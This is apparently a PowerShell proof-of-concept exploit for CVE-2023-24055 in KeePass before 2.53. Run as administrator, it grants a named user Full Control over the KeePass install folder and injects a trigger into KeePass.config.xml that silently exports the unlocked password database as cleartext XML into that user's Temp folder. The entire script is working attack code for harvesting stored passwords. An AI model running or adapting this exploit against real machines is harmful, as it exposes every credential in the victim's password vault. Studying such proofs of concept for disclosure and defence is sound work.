# Title:         CVE_2023-24055 PoC
# Description:   Exploit KeePass vulnerability under version 2.53
# Author:        Jules BOZOUKLIAN - @bozou_client

echo "### Runing CVE-2023-24055 PoC"

#Requires -RunAsAdministrator
echo "### PowerShell admin OK"

# Give user Full Control access to the KeePass directory
$User = "bozou_client"
$Path = "C:\Program Files\KeePass Password Safe 2\"
$Acl = Get-Acl -Path $path
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($User, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$Acl.SetAccessRule($AccessRule)
Set-Acl -Path $Path -AclObject $Acl

echo "### Setting ACL FullControl to $Path for user $User"

# Edit the KeePass.config.xml
$ConfigFilePath = "C:\Program Files\KeePass Password Safe 2\KeePass.config.xml"
$Poc = "
<Triggers>
    <Trigger>
	    <Guid>lztpSRd56EuYtwwqntH7TQ==</Guid>
		<Name>CVE-2023-24055</Name>
		<Events>
		    <Event>
			    <TypeGuid>s6j9/ngTSmqcXdW6hDqbjg==</TypeGuid>
				<Parameters>
			        <Parameter>0</Parameter>
				    <Parameter />
			    </Parameters>
		    </Event>
		</Events>
		<Conditions />
		<Actions>
			<Action>
				<TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
				<Parameters>
				    <Parameter>c:\Users\$User\AppData\Local\Temp\output.xml</Parameter>
					<Parameter>KeePass XML (2.x)</Parameter>
					<Parameter />
					<Parameter />
			    </Parameters>
		    </Action>
	    </Actions>
    </Trigger>
</Triggers>
"
(Get-Content $ConfigFilePath).Replace('<Triggers />', $Poc) | Set-Content $ConfigFilePath

echo "### KeePass.config.exe file modified"
